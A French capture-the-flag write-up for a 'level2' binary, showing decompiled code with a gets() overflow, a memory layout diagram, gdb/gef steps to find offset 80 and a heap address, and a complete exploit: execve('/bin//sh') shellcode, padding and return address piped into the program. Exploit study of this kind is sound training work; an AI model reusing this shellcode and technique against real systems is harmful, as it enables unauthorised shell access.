# level2 : overflow + shellcode heap

    void p(void)
    {
      uint unaff_retaddr;
      char local_50[76];

      fflush(stdout);
      gets(local_50);
      if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", unaff_retaddr);
        _exit(1);
      }
      puts(local_50);
      strdup(local_50);
      return;
    }

    void main(void)
    {
      p();
      return;
    }

`unaff_retaddr` c'est l'adresse de retour de p, le programme vérifie ce qu'on ecrit par-dessus avant de continuer. Le test bloque toute adresse de retour qui commence par `0xb` ça couvre la stack (`0xbfxxxxxx`) et libc (`0xb7xxxxxx`), donc pas de retour direct sur la stack, pas de ret2libc. 

    0xffffffff ┐
            │  réservé au noyau (pas accessible depuis ton programme)
    0xc0000000 ┘

    0xbfffffff ┐  stack les variables locales, argv, les variables
            │  d'environnement. Grandit vers le BAS (les adresses
            │  diminuent à chaque appel de fonction imbriqué)
    ...     ┘

    0xb7fff000 ┐  LIBC et les autres bibliothèques partagées
            │  chargées ici par le linker dynamique (ld.so)
    ...     ┘



    …grand espace vide, un "trou" entre les deux…



    0x0804c1c0 ┐  heap (heap) c'est ici que `malloc`/`strdup`
            │  vont chercher de la place. Grandit vers le HAUT.
    0x08049000 ┘  (fin du .bss/.data du programme)

    0x08048000 ┐  CODE + DONNÉES du binaire p(), main(),
            │  tes chaînes de caractères statiques, etc.
    0x08048000 ┘  adresse de chargement fixe (binaire EXEC, pas PIE)

Sauf que juste après le check, `strdup(local_50)` recopie ton buffer (donc ton shellcode) sur le heap, à une adresse basse (`0x0804xxxx`) pas couverte par le test. Il suffit de rediriger l'adresse de retour vers cette copie sur le heap au lieu de la stack.

**Trouver l'offset avec gef**

Même principe qu'avant, buffer différent donc offset différent :

    cd level02
    gdb ./level2
    gef> pattern create 200
    gef> quit
    echo -n "aaaabaaacaaad..." > pattern.txt
    gdb ./level2
    gef> run < pattern.txt
    gef> pattern search $eip

Ça donne l'offset : 80

**Trouver l'adresse du heap après `strdup`**

    gef> disas p
    gef> b *0x804853d
    gef> run
    gef> p/x $eax
    $1 = 0x804a008

**Construire le payload**
https://picoctfsolutions.com/tools/pwntools-payload

 le payload :  execve("/bin//sh", NULL, NULL);

    \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

Payload : shellcode (21 octets) + bourrage jusqu'à l'offset 80 (`80 - 21 = 59` octets) + adresse du heap :

    (printf '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'; printf 'A%.0s' {1..59}; printf '\x08\xa0\x04\x08') > /tmp/payload

injection :

    cat /tmp/payload - | ./level2
